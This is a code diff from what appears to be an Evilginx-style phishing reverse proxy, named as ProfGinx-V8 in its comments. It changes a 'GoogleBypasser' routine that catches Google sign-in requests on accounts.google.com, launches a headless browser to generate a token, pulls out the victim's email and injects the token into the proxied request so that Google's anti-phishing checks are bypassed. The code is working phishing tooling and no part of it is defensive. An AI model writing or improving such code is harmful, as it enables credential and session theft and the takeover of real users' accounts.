@@ -1438,31 +1438,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if strings.EqualFold(origHostForGoogle, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
 												log.Debug("GoogleBypass working with: %v (origHost: %v)", req.RequestURI, origHostForGoogle)
 
-												// ============================================================================
-												// SIMPLIFIED SYNCHRONOUS FLOW
-												// No caching, no async - just launch browser and get token
-												// This is the proven working approach from ProfGinx-V8
-												// ============================================================================
-												log.Info("[GoogleBypasser] MI613e request detected, generating token...")
-
-												b := &GoogleBypasser{
-													isHeadless:     true,
-													withDevTools:   false,
-													slowMotionTime: 0,
-												}
-
-												// Launch fresh browser instance
-												b.Launch()
-												defer b.Close()
-
-												// Decode URL-encoded body
 												decodedBody, err := url.QueryUnescape(string(body))
 												if err != nil {
-													log.Error("[GoogleBypasser] Failed to decode body: %v", err)
-													// Restore body even if decode fails
-													req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+													log.Error("Failed to decode body: %v", err)
 												} else {
 													decodedBodyBytes := []byte(decodedBody)
+
+													// ============================================================================
+													// SIMPLIFIED SYNCHRONOUS FLOW
+													// No caching, no async - just launch browser and get token
+													// This is the proven working approach from ProfGinx-V8
+													// ============================================================================
+													log.Info("[GoogleBypasser] MI613e request detected, generating token...")
+
+													b := &GoogleBypasser{
+														isHeadless:     true,
+														withDevTools:   false,
+														slowMotionTime: 0,
+													}
+
+													// Launch fresh browser instance
+													b.Launch()
+													defer b.Close()
 
 													// Extract email and get token
 													b.GetEmail(decodedBodyBytes)
@@ -1473,21 +1470,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 														decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
 														postForm, err := url.ParseQuery(string(decodedBodyBytes))
 														if err != nil {
-															log.Error("[GoogleBypasser] Failed to parse form data: %v", err)
-															// Restore original body if parse fails
-															req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+															log.Error("Failed to parse form data: %v", err)
 														} else {
-															// Create new body with injected token
 															body = []byte(postForm.Encode())
 															req.ContentLength = int64(len(body))
-															req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
 														}
 														log.Success("[GoogleBypasser] ✅ Token injected successfully")
 													} else {
 														log.Error("[GoogleBypasser] ❌ Failed to generate token")
-														// Restore original body if token generation fails
-														req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
 													}
+
+													req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 												}
 											}
 										}
